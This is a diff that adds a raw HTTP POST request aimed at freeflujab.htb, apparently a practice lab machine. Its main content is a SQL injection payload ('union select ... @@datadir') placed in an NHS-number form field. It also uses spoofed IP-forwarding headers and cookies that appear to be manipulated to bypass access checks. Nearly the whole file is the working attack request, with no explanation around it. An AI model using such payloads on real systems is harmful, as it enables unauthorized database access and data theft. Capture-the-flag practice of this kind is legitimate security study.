@@ -1,0 +1,21 @@
+POST /?cancel HTTP/1.1
+Host: freeflujab.htb
+Connection: close
+Content-Length: 87
+Cache-Control: max-age=0
+Origin: https://freeflujab.htb
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: https://freeflujab.htb/?book
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,ru;q=0.8
+Cookie: Modus=Q29uZmlndXJlPU51bGw%3D; Patient=50d1b146a7c60251aa72c12cdc899cb5; Registered=NTBkMWIxNDZhN2M2MDI1MWFhNzJjMTJjZGM4OTljYjU9TnVsbA%3D%3D
+Upgrade-Insecure-Requests: 1
+X-Originating-IP: 10.10.15.12
+X-Forwarded-For: 10.10.15.12
+X-Remote-IP: 10.10.15.12
+X-Remote-Addr: 10.10.15.12
+
+nhsnum=NHS-945-486-5117' union select 1,2,@@datadir,4,5-- -&submit=Cancel+Appointment
